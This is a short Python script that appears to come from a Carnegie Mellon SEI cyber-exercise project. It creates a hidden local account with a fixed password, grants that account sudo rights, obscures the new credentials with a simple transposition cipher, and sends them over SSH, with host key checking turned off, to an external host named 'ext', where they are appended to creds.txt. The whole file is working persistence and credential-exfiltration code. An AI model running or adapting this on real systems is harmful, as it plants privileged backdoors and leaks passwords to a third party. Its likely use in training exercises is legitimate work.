#!/usr/bin/python3

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import sys,os, subprocess, time, random, json, pexpect

def send(enc, pwd):
    pexpect.run(f"sudo ssh -o StrictHostKeyChecking=no jack@ext 'echo {enc} | tee -a creds.txt'",events={'(?i)password':pwd+'\n'}).decode('utf-8')

def checkNonChar(plain, index, nonChar, nonCharMapping):
    while True:
        if plain[index] in nonChar:
            nonCharMapping.append([index, plain[index]])
            index += 1
            continue
        return index, nonChar

def encrypt(data):
    plain = f"The account has been created locally successfully. The new username is: {data['name']}. The password is the same as the one used for jack: {data['password']}"
    key = data['name']
    mapper = dict()
    index = 0
    nonChar = ['.', ':',' ']
    nonCharMapping = []
    while index < len(plain):
        for k in key:
            if plain[index] in nonChar:
                index,nonChar = checkNonChar(plain, index, nonChar, nonCharMapping)
            mapper[k] = mapper[k]+plain[index] if k in mapper.keys() else plain[index]
            index += 1
            if index >= len(plain):
                break
    
    encrypted = ''
    for x in sorted(mapper.keys()):
        encrypted += mapper[x]

    for entry in nonCharMapping:
        encrypted = encrypted[:entry[0]]+entry[1]+encrypted[entry[0]:]
    
    subprocess.run(f"echo {encrypted}",shell=True)      
    send(encrypted,data['password'])                

def create_user():
    nameList = ['jack','hector','henry','sao','james','davy','calypso']
    pwd = '#pwd'
    data = None
    for name in nameList:
        if name not in (subprocess.run("cat /etc/passwd",shell=True,capture_output=True).stdout.decode('utf-8')):
            data = {'name':name,'password':pwd}
            subprocess.run(f"sudo useradd {data['name']}",shell=True)
            break
    if data == None:
        data = {'name':random.choice(nameList),'password':pwd}
    subprocess.run(f"echo '{data['name']}:{data['password']}' | sudo chpasswd",shell=True)
    subprocess.run(f"sudo usermod -aG sudo {data['name']}",shell=True)
    encrypt(data)
    

if __name__ == '__main__':
    create_user()
